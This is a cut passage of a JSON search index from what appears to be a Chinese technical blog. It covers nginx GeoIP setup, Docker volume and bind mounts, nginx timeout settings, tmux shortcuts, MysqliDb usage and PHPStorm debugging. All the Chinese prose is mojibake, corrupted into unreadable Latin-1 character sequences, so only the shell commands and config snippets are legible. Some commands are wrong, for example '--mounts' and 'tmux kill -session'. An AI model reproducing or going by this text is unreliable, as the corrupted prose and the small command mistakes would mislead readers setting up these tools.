GeoIP2æˆ–Geolite2æ•°æ®åº“å’ŒNGINX Plus GeoIP2æ¨¡å—ã€‚ Centosï¼š 1yum install nginx-plus-module-geoip2 Ubuntuï¼š 1sudo apt-get install nginx-plus-module-geoip2 ç„¶åå°† load_module æŒ‡ä»¤éƒ½æ”¾åœ¨nginx.conf çš„é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨ï¼š 123456load_module modules&#x2F;ngx_http_geoip2_module.so;load_module modules&#x2F;ngx_stream_geoip2_module.so;http &#123; ...&#125; å®‰è£… GeoIP æ•°æ®æºè‡ªä» 2019å¹´12æœˆ30æ—¥å¼€å§‹ï¼Œå°±ä¸èƒ½ç›´æ¥ä»MaxMind ä¸Šä¸‹è½½äº†ï¼Œéœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œè·å– license keyï¼Œç„¶åwget æ—¶å¸¦ä¸Š keyã€‚å…·ä½“å¯ä»¥æŸ¥é˜…è¿™ç¯‡æ–‡ç« ã€‚ è¿™æ˜¯ä¸€ç§å®‰è£…æ–¹å¼ï¼Œå¦‚æœè§‰å¾—éº»çƒ¦ï¼Œå¯ä»¥å°è¯•ä¸‹é¢è¿™ç§æ–¹å¼ã€‚ å®‰è£…ä¾èµ–ï¼š 123sudo add-apt-repository ppa:maxmind&#x2F;ppasudo apt updatesudo apt install libgeoip1 libgeoip-dev geoip-bin ä¸‹è½½æºç åŒ…ï¼Œå®‰è£…åº”ç”¨ï¼š 123456sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gzsudo tar -zxvf GeoIP-1.6.12.tar.gzcd GeoIP-1.6.12 &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install æŸ¥æ‰¾GeoIP.datæ‰€åœ¨ä½ç½®ï¼š 12sudo find &#x2F; -name GeoIP.dat&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨ï¼š 12345678910geoip_country &#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;server &#123; ... location &#x2F;myip &#123; default_type text&#x2F;plain; return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;; &#125;&#125; é€šè¿‡ä»¥ä¸‹å˜é‡ç»¼åˆè·å–åœ°åŸŸä¿¡æ¯ï¼š $remote_addrï¼šIPåœ°å€ $geoip_country_nameï¼šå›½å®¶ $geoip_country_codeï¼šå¯¹åº”ç¼–ç  $geoip_cityï¼šåŸå¸‚åç§° å‚è€ƒé“¾æ¥ nginx: [emerg] unknown directive â€œgeoip_countryâ€ in /etc/nginx/nginx.conf:23 install GeoIP install GeoIP module","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Docker æ•°æ®æŒ‚è½½","slug":"docker-data-mount","date":"2020-10-07T12:24:01.000Z","updated":"2020-10-07T12:24:40.708Z","comments":true,"path":"docker-data-mount/","link":"","permalink":"https://www.0x2beace.com/docker-data-mount/","excerpt":"","text":"æ•°æ®æŒ‚è½½æ•°æ®æŒ‚è½½åœ¨Docker ä¸­è¿˜æ˜¯æŒºé‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºæœ‰å¤šç§æ–¹å¼ï¼Œè€Œä¸åŒçš„æ–¹å¼æ‰€å¯¹åº”çš„å¤„ç†æ•°æ®çš„é€»è¾‘ä¹Ÿä¸ä¸€æ ·ã€‚ Volumesï¼šDocker ç®¡ç†å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼ˆ/var/lib/docker/volumesï¼‰ã€‚ Bind Mountsï¼šå°†å®¿ä¸»æœºä¸Šçš„ä»»æ„ä½ç½®çš„æ–‡ä»¶æˆ–ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ tmpfsï¼šæŒ‚è½½å­˜å‚¨åœ¨ä¸»æœºç³»ç»Ÿçš„å†…å­˜ä¸­ï¼Œè€Œä¸ä¼šå†™å…¥ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚å¦‚æœä¸ç³»ç»Ÿå°†æ•°æ®æŒä¹…å­˜å‚¨åœ¨ä»»ä½•ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨tmpfsï¼ŒåŒæ—¶é¿å…å†™å…¥å®¹å™¨å¯å†™å±‚æé«˜æ€§èƒ½ã€‚ è¿™é‡Œä¸»è¦ä»‹ç»å‰ä¸¤è€…ï¼Œåè€…ä½¿ç”¨çš„å¹¶ä¸å¤šã€‚æ³¨æ„ç¬¬ä¸€ç§å’Œç¬¬äºŒç§æ˜¯å­˜åœ¨åŒºåˆ«çš„ï¼Œå‰è€…æ˜¯ä½¿ç”¨çš„æ•°æ®å·è¿›è¡ŒæŒ‚è½½ï¼Œè€Œåè€…åˆ™æ˜¯ç›´æ¥ä½¿ç”¨çš„å®¿ä¸»æœºä¸Šçš„æ–‡ä»¶æˆ–è€…ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå°†å®¹å™¨åˆ é™¤ä¹‹åï¼Œå®¹å™¨å†…æ‰€æœ‰çš„æ”¹åŠ¨å°†ä¸å¤å­˜åœ¨ã€‚ æŒ‚è½½æ•°æ®å·é€šå¸¸æ˜¯æœ€å¸¸ç”¨ä¸”æœ€å¥½çš„æ–¹å¼ï¼Œè¿™ç§æ–¹å¼ä¼šå°†å®¹å™¨ä¸­çš„æ•°æ®æŒä¹…åŒ–åœ¨å®¿ä¸»æœºä¸­ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å½“å®¹å™¨è¢«åˆ é™¤æˆ–è€…æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶ï¼Œæ•°æ®ä»æ˜¯å®Œæ•´çš„ã€‚ æŒ‚è½½æ•°æ®å·æœ‰ä¸¤ç§æ–¹å¼ï¼š ä½¿ç”¨--mount ä½¿ç”¨-v å‰è€…æ˜¯æ–°ç‰ˆæœ¬çš„æ–¹å¼ï¼Œåè€…æ˜¯è€ç‰ˆæœ¬çš„æ–¹å¼ï¼Œå…¶æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ã€‚ Volumesåˆ›å»ºä¸€ä¸ªæ•°æ®å·ï¼š 1docker volume create &lt;volume name&gt; åˆ—å‡ºæ•°æ®å·åˆ—è¡¨ï¼š 1docker volume ls åˆ—å‡ºæ•°æ®å·çš„è¯¦æƒ…ä¿¡æ¯ï¼š 1docker volume inspect &lt;volume name&gt; åˆ é™¤æ•°æ®å·ï¼š 1docker volume rm &lt;volume name&gt; ç”¨æ•°æ®å·åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼š 123456789# æ–°ç‰ˆæœ¬docker run -d -it \\--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# è€ç‰ˆæœ¬docker run -d -it \\--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx éœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¦‚æœæ²¡æœ‰æŒ‡å®šæ•°æ®å·ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»º Bind Mountsä½¿ç”¨bind mounts åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼š 12345678910111213# æ–°ç‰ˆæœ¬docker run -d -it \\--name nginx \\-p 8080:80 \\--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# è€ç‰ˆæœ¬docker run -d -it \\--name nginx \\-p 8080:80 \\-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx éœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¦‚æœæºæ–‡ä»¶/ç›®å½•æ²¡æœ‰å­˜åœ¨ï¼Œdocker ä¸ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œè€Œä¼šè‡ªåŠ¨æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ å¦‚æœæŒ‚è½½ç›®æ ‡åœ¨å®¹å™¨ä¸­æ˜¯éç©ºç›®å½•ï¼Œåˆ™è¯¥ç›®å½•ç°æœ‰å†…å®¹å°†è¢«éšè—ã€‚","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"nginx è¶…æ—¶é—®é¢˜â€”â€”upstream timed out (110: Connection timed out) while reading response header from upstream","slug":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream","date":"2020-10-05T12:28:45.000Z","updated":"2020-10-05T12:29:53.756Z","comments":true,"path":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","link":"","permalink":"https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","excerpt":"ä»Šå¤©æ—©ä¸Šèµ·æ¥ï¼Œå‘ç°åå°ç™»å½•ä¸ä¸Šï¼Œæ‰“å¼€æ§åˆ¶å°å‘ç°å‡ ä¹æ‰€æœ‰è¯·æ±‚éƒ½è¶…æ—¶äº†ã€‚","text":"ä»Šå¤©æ—©ä¸Šèµ·æ¥ï¼Œå‘ç°åå°ç™»å½•ä¸ä¸Šï¼Œæ‰“å¼€æ§åˆ¶å°å‘ç°å‡ ä¹æ‰€æœ‰è¯·æ±‚éƒ½è¶…æ—¶äº†ã€‚ æ‰“å¼€nginx çš„å¼‚å¸¸æ—¥å¿—å¯ä»¥çœ‹åˆ°å…¨æ˜¯ç›¸åŒçš„å¼‚å¸¸ï¼š upstream timed out (110: Connection timed out) while reading response header from upstream ä»è¿™ä¸ªå¼‚å¸¸æ—¥å¿—å¯ä»¥åˆ†æå‡ºï¼Œç”±äºnginx ä»£ç†å»è·å–ä¸Šæ¸¸æœåŠ¡å™¨çš„å“åº”è¶…æ—¶äº†ï¼Œé‚£ä¹ˆç©¶ç«Ÿæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´å®ƒä¼šè¶…æ—¶å‘¢ï¼Ÿ é€šå¸¸ä¼šå¯¼è‡´è¯·æ±‚è¶…æ—¶å¯èƒ½æœ‰ä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š æ¥å£æ¯”è¾ƒå¤æ‚ï¼Œå“åº”æ—¶é—´æ…¢ï¼Œå¯¼è‡´è¶…æ—¶ã€‚ å¤„ç†è¯·æ±‚çš„è¿›ç¨‹å¼‚å¸¸ã€‚ ä»£ç†æœåŠ¡å™¨ä¸ä¸Šæ¸¸æœåŠ¡å™¨çš„ç½‘ç»œé—®é¢˜ã€‚ å› ä¸ºè¯·æ±‚ä¸€ç›´éƒ½æ˜¯é‚£äº›è¯·æ±‚ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§å¯èƒ½æ€§å¯ä»¥æ’é™¤ã€‚å¦å¤–å­è¿›ç¨‹æ•°é‡è®¾ç½®çš„æ˜¯æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ç¬¬äºŒç§åº”è¯¥ä¹Ÿå¯ä»¥æ’é™¤ã€‚ å¯¹äºæœåŠ¡å™¨çš„ç½‘ç»œé—®é¢˜ï¼Œå¦‚æœæ¡ä»¶å…è®¸ï¼Œå¯ä»¥ç›´æ¥ä»æ ¹æœ¬ä¸Šè§£å†³ï¼Œå¦å¤–ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®è¶…æ—¶æ—¶é—´æ¥å»¶ç¼“è¯·æ±‚è¶…æ—¶ã€‚ åœ¨server ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 1234567891011large_client_header_buffers 4 16k;client_max_body_size 30m;client_body_buffer_size 128k;proxy_connect_timeout 240s;proxy_read_timeout 240s;proxy_send_timeout 240s;proxy_buffer_size 64k;proxy_buffers 4 32k;proxy_busy_buffers_size 64k;proxy_temp_file_write_size 64k; ç„¶åé‡å¯Nginxã€‚ å‚è€ƒé“¾æ¥ nginx è®¾ç½®è¶…æ—¶æ—¶é—´-Nginx å®˜ç½‘","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Tmux å¿«é€Ÿä¸Šæ‰‹","slug":"tmux-quick-start","date":"2020-10-04T12:39:38.000Z","updated":"2020-10-04T12:41:19.876Z","comments":true,"path":"tmux-quick-start/","link":"","permalink":"https://www.0x2beace.com/tmux-quick-start/","excerpt":"","text":"æœ¬æ¥ä¹‹å‰å°±çŸ¥é“æœ‰ tmux è¿™æ ·ä¸€ä¸ªçª—å£åˆ†éš”å·¥å…·ï¼Œåªä¸è¿‡ä¸€ç›´ä½¿ç”¨ç€iTerm2ï¼Œæœ¬èº«å°±è‡ªå¸¦æœ‰æ ‡ç­¾é¡µåŠŸèƒ½ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡å»å­¦ä¹ è¿™ä¸ªå·¥å…·ã€‚ è¿™æ®µæ—¶é—´éœ€è¦ç»å¸¸è®¿é—®LinuxæœåŠ¡å™¨ï¼Œæ‰€ä»¥åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…äº†è¿™ä¸ªå·¥å…·ã€‚ å®‰è£…Macï¼š 1brew install tmux Linux: 1apt-get install tmux ä¸€èˆ¬æƒ…å†µä¸‹ tmux ä¸­æ‰€æœ‰çš„å¿«æ·é”®éƒ½éœ€è¦å’Œå‰ç¼€å¿«æ·é”® âŒƒb æ¥ç»„åˆä½¿ç”¨ï¼ˆæ³¨ï¼šâŒƒ ä¸º Mac çš„ control é”®ï¼‰ï¼Œä»¥ä¸‹æ˜¯å¸¸ç”¨çš„çª—æ ¼ï¼ˆpaneï¼‰å¿«æ·é”®åˆ—è¡¨ã€‚ ä¼šè¯ç¬¬ä¸€æ¬¡ä½¿ç”¨tmux å¯èƒ½ä¼šè¢«Sessionã€çª—å£ã€çª—æ ¼ è¿™äº›é™Œç”Ÿçš„æ¦‚å¿µï¼Œå¼„å¾—æ‘¸ä¸ç€å¤´è„‘ã€‚ è¿™é‡Œæ€»ç»“æˆä¸€å¥è¯å°±æ˜¯ï¼šä¸€ä¸ªå®Œæ•´çš„ä¼šè¯ï¼ˆSessionï¼‰æ˜¯ç”±æ•°ä¸ªçª—å£ç»„æˆï¼Œè€Œä¸€ä¸ªçª—å£åˆå¯ä»¥åˆ†æˆè‹¥å„ä¸ªçª—æ ¼ã€‚ ä½¿ç”¨tmux å‘½ä»¤ä¼šé»˜è®¤æ–°å»ºä¸€ä¸ªtmux ä¼šè¯ï¼š 12&#x2F;&#x2F; é»˜è®¤æ–°å»ºä¸€ä¸ªSession åç§°ä¸º 0 çš„çª—å£ã€‚tmux å¸¸ç”¨Sessionæ“ä½œï¼š $ é‡å‘½åå½“å‰ä¼šè¯ s é€‰æ‹©ä¼šè¯åˆ—è¡¨ d é€€å‡ºå½“å‰ä¼šè¯ï¼ˆä¸æ˜¯åˆ é™¤ï¼‰ï¼Œè¿è¡Œåå°†ä¼šé€€å‡º tmux è¿›ç¨‹ï¼Œè¿”å›è‡³ shell ä¸»è¿›ç¨‹ã€‚ çª—å£çª—å£çš„æ¦‚å¿µä¸åŒäºçª—æ ¼ï¼Œçª—å£äº’ä¸å½±å“ï¼Œçª—æ ¼ç›¸äº’åˆ†éš”ã€‚ å¸¸ç”¨çª—å£æ“ä½œï¼š c æ–°å»ºçª—å£ï¼Œæ­¤æ—¶å½“å‰çª—å£ä¼šåˆ‡æ¢è‡³æ–°çª—å£ï¼Œä¸å½±å“åŸæœ‰çª—å£çš„çŠ¶æ€ p åˆ‡æ¢è‡³ä¸Šä¸€çª—å£ n åˆ‡æ¢è‡³ä¸‹ä¸€çª—å£ w çª—å£åˆ—è¡¨é€‰æ‹©ï¼Œæ³¨æ„ macOS ä¸‹ä½¿ç”¨ âŒƒp å’Œ âŒƒn è¿›è¡Œä¸Šä¸‹é€‰æ‹© &amp; å…³é—­å½“å‰çª—å£ , é‡å‘½åçª—å£ï¼Œå¯ä»¥ä½¿ç”¨ä¸­æ–‡ï¼Œé‡å‘½ååèƒ½åœ¨ tmux çŠ¶æ€æ æ›´å¿«é€Ÿçš„è¯†åˆ«çª—å£ id 0 åˆ‡æ¢è‡³ 0 å·çª—å£ï¼Œä½¿ç”¨å…¶ä»–æ•°å­— id åˆ‡æ¢è‡³å¯¹åº”çª—å£ f æ ¹æ®çª—å£åæœç´¢é€‰æ‹©çª—å£ï¼Œå¯æ¨¡ç³ŠåŒ¹é… çª—æ ¼çª—æ ¼æ˜¯åœ¨çª—å£ä¸‹çš„æ¦‚å¿µï¼Œè‹¥å¹²ä¸ªçª—æ ¼ç»„æˆä¸€ä¸ªçª—å£ã€‚ å¸¸ç”¨çª—æ ¼æ“ä½œï¼š % å·¦å³å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼ â€œ ä¸Šä¸‹å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼ x å…³é—­å½“å‰çª—æ ¼ { å½“å‰çª—æ ¼å‰ç§» } å½“å‰çª—æ ¼åç§» ; é€‰æ‹©ä¸Šæ¬¡ä½¿ç”¨çš„çª—æ ¼ o é€‰æ‹©ä¸‹ä¸€ä¸ªçª—æ ¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šä¸‹å·¦å³æ–¹å‘é”®æ¥é€‰æ‹© space åˆ‡æ¢çª—æ ¼å¸ƒå±€ï¼Œtmux å†…ç½®äº†äº”ç§çª—æ ¼å¸ƒå±€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ âŒ¥1 è‡³ âŒ¥5æ¥åˆ‡æ¢ z æœ€å¤§åŒ–å½“å‰çª—æ ¼ï¼Œå†æ¬¡æ‰§è¡Œå¯æ¢å¤åŸæ¥å¤§å° q æ˜¾ç¤ºæ‰€æœ‰çª—æ ¼çš„åºå·ï¼Œåœ¨åºå·å‡ºç°æœŸé—´æŒ‰ä¸‹å¯¹åº”çš„æ•°å­—ï¼Œå³å¯è·³è½¬è‡³å¯¹åº”çš„çª—æ ¼ å…¶ä»–å‘½ä»¤ä¸Šé¢é‚£äº›å‘½ä»¤éƒ½æ˜¯é…åˆâŒƒ + bå¿«æ·é”®ä½¿ç”¨çš„ï¼Œä¸‹é¢çš„è¿™äº›å‘½ä»¤éƒ½æ˜¯åœ¨Shellè¿›ç¨‹ä¸­ç›´æ¥æ‰§è¡Œçš„ã€‚ æ–°å»ºåç§°ä¸º foo çš„ä¼šè¯ 1tmux new -s foo åˆ—å‡ºæ‰€æœ‰ tmux ä¼šè¯ 1tmux ls æ¢å¤ä¸Šä¸€æ¬¡ä¼šè¯ 1tmux a æ¢å¤åä¸º foo çš„ä¼šè¯ 1tmux a -t foo åˆ é™¤åä¸º foo çš„ä¼šè¯ 1tmux kill -session -t foo åˆ é™¤æ‰€æœ‰ä¼šè¯ 1tmux kill -server tmux or iterm2tmux å’ŒiTerm2 éƒ½æœ‰çª—å£ç®¡ç†æ–¹é¢çš„åŠŸèƒ½ï¼Œåªæ˜¯å‰è€…ç›¸æ¯”åè€…çš„ä¼˜åŠ¿åœ¨äºï¼š iTerm2 çš„çª—æ ¼åˆ‡æ¢å¿«æ·é”®ï¼ˆâŒ˜âŒ¥â†’ï¼‰å®¹æ˜“ä¸å…¶ä»–è½¯ä»¶å…¨å±€å¿«æ·é”®å†²çªï¼ˆä¾‹å¦‚ Spectacle çš„çª—å£åˆ†å‰²å¿«æ·é”®ï¼‰ï¼Œtmux ç”±äºå­˜åœ¨å‰ç¼€å¿«æ·é”®ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å¿«æ·é”®å†²çªé—®é¢˜ï¼› tmux å¯ä»¥åœ¨ç»ˆç«¯è½¯ä»¶é‡å¯åé€šè¿‡å‘½ä»¤è¡Œæ¢å¤ä¸Šæ¬¡çš„ session ï¼Œè€Œç»ˆç«¯è½¯ä»¶åˆ™ä¸è¡Œï¼› tmux ç®€æ´ä¼˜é›…ã€è®¢åˆ¶æ€§å¼ºï¼Œå­¦ä¼šä¹‹åä¹Ÿèƒ½åœ¨ Linux ä¸Šä½¿ç”¨ï¼Œæœ‰åŠ©äºé€¼æ ¼æå‡ã€‚ å‚è€ƒé“¾æ¥ Tmux å¿«æ·é”®&amp;é€ŸæŸ¥è¡¨&amp;ç®€æ˜æ•™ç¨‹ ååˆ†é’Ÿå­¦ä¼š Tmux [Tmux å¿«æ·é”®å’Œå¤‡å¿˜å½•](","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"}]},{"title":"MysqliDb å¿«é€Ÿä¸Šæ‰‹","slug":"mysqlidb-is-quick-to-get-started","date":"2020-10-02T07:26:03.000Z","updated":"2020-10-02T07:27:10.385Z","comments":true,"path":"mysqlidb-is-quick-to-get-started/","link":"","permalink":"https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/","excerpt":"","text":"MysqliDb æ˜¯åŸºäº mysqli æ‰©å±•å‡ºæ¥çš„ä¸€ä¸ªç±»åº“ï¼Œå…¶ä¸­å°è£…äº†å¾ˆå¤šå¸¸ç”¨çš„Mysql åŸºç¡€æ“ä½œï¼Œç›¸æ¯”åŸç”Ÿçš„æ–¹å¼ï¼Œåè€…ä½¿ç”¨èµ·æ¥æ›´åŠ æ–¹ä¾¿ã€‚ å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š æ”¯æŒé“¾å¼æ“ä½œ æ”¯æŒMysql å‡½æ•°çš„ä½¿ç”¨ â€¦ å®‰è£…ä½¿ç”¨composer å®‰è£… 1composer require thingengineer&#x2F;mysqli-database-class:dev-master å› ä¸ºMysqliDbæ²¡æœ‰å‘½åç©ºé—´ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„è¯ï¼Œä¸èƒ½è‡ªåŠ¨åŠ è½½ï¼Œåªèƒ½å…ˆå¼•å…¥ã€‚ 1require &quot;MysqliDb.php&quot;; åˆå§‹åŒ–åˆå§‹åŒ–è¿æ¥æœ‰å‡ ç§æ–¹å¼ï¼š 1. MysqliDb å­—ç¬¦ä¸²1$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;); 2. MysqliDb å¯¹è±¡123456789$db &#x3D; new MysqliDb ([ &#39;host&#39; &#x3D;&gt; &#39;host&#39;, &#39;username&#39; &#x3D;&gt; &#39;username&#39;, &#39;password&#39; &#x3D;&gt; &#39;password&#39;, &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;, &#39;port&#39; &#x3D;&gt; 3306, &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;, &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;]); 3. mysqli å¯¹è±¡12$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);$db &#x3D; new MysqliDb ($mysqli); æ–°å¢å‘user è¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼š 123456$data &#x3D; [ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;age&quot; &#x3D;&gt; 21, &quot;gender&quot; &#x3D;&gt; &quot;man&quot;];$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data); è¿”å›å€¼ç±»å‹ï¼šbool ä¿®æ”¹ä¿®æ”¹user è¡¨ä¸­çš„ä¸€æ¡è®°å½• 12345$data &#x3D; [ &quot;age&quot; &#x3D;&gt; 22,];$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;]) -&gt;update(&quot;user&quot;, $data); è¿”å›å€¼ç±»å‹ï¼šbool æŸ¥è¯¢è·å–user è¡¨æ‰€æœ‰æ•°æ®ï¼š1$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;); è¿”å›å€¼ï¼šå¤šç»´æ•°ç»„ è·å–user è¡¨å•æ¡æ•°æ®ï¼š1$result &#x3D; $db-&gt;getOne(&quot;user&quot;, &quot;*&quot;); è¿”å›å€¼ï¼šå…³è”æ•°ç»„ è·å–user è¡¨å•ä¸ªå­—æ®µçš„å€¼ï¼š12$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;) -&gt;getValue(&quot;user&quot;, &quot;*&quot;); è¿”å›å€¼ï¼šstring è·å–æŸ¥è¯¢æ¡æ•°ï¼š1$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;); åˆ é™¤åˆ é™¤user è¡¨ä¸­ä¸€æ¡è®°å½• 12$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;) -&gt;delete(&quot;user); è¿è¡ŒåŸç”ŸSQL1$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \\&quot;boo\\&quot;&quot;) æ€»ä½“æ¥è¯´ï¼ŒMysqliDb çœŸçš„æŒºå¥½ç”¨çš„ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³æ‰€æœ‰æ—¥å¸¸éœ€æ±‚ã€‚è¿™é‡Œåªæ˜¯åˆ—ä¸¾äº†æœ€åŸºæœ¬çš„CURDï¼Œæ›´å¤šæ“ä½œå¯ä»¥å‚è€ƒå®˜ç½‘æ‰‹å†Œã€‚ å‚è€ƒé“¾æ¥joshcam/mysqli-database-class","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"}]},{"title":"PHPStrom é«˜çº§æŠ€å·§æ•´ç†","slug":"phpstorm-advanced-skills-finishing","date":"2020-10-01T02:39:34.000Z","updated":"2020-10-02T07:25:43.207Z","comments":true,"path":"phpstorm-advanced-skills-finishing/","link":"","permalink":"https://www.0x2beace.com/phpstorm-advanced-skills-finishing/","excerpt":"","text":"PHPStrom æ˜¯æˆ‘æ—¥å¸¸ä½¿ç”¨é¢‘ç‡å¾ˆé«˜çš„ IDEã€‚ åŸºç¡€çš„ä½¿ç”¨è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œè¿™é‡Œä¸»è¦æ˜¯ç”¨æ¥æ•´ç†ä¸€äº›æ¯”è¾ƒé«˜çº§çš„ç”¨æ³•ã€‚ è°ƒè¯•æŠ€å·§è°ƒè¯•æ˜¯æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¸å¯ç¼ºå°‘çš„ä¸€éƒ¨åˆ†ã€‚ è·¯å¾„æ˜ å°„é€šå¸¸éƒ½æ˜¯ç”¨æ¥è°ƒè¯•æœ¬åœ°ä»£ç ï¼Œå¯å¦‚æœéœ€è¦è°ƒè¯•è™šæ‹Ÿæœºæˆ–è€…å…¶ä»–åº”ç”¨ä¸­æ—¶ï¼Œé‚£è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ æ‰“å¼€åå¥½è®¾ç½®æˆ–è€…è®¾ç½®ï¼Œæ‰¾åˆ°ä¸€ä¸ªå·²ç»é…ç½®å¥½çš„æœåŠ¡ï¼Œå‹¾é€‰æ˜ å°„ã€‚ ç„¶åæ‰¾åˆ°è¯¥æœåŠ¡çš„å…¥å£é…ç½®æ–‡ä»¶ï¼Œåé¢çš„æ–‡ä»¶è·¯å¾„å¡«ç»å¯¹è·¯å¾„ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"}]},{"title":"é€’å½’ç®—æ³•","slug":"recursive-algorithm","date":"2020-09-30T12:21:12.000Z","updated":"2020-10-01T02:39:46.124Z","comments":true,"path":"recursive-algorithm/","link":"","permalink":"https://www.0x2beace.com/recursive-algorithm/","excerpt":"æœ€è¿‘åœ¨ä¸šåŠ¡ä¸Šé‡åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦æ 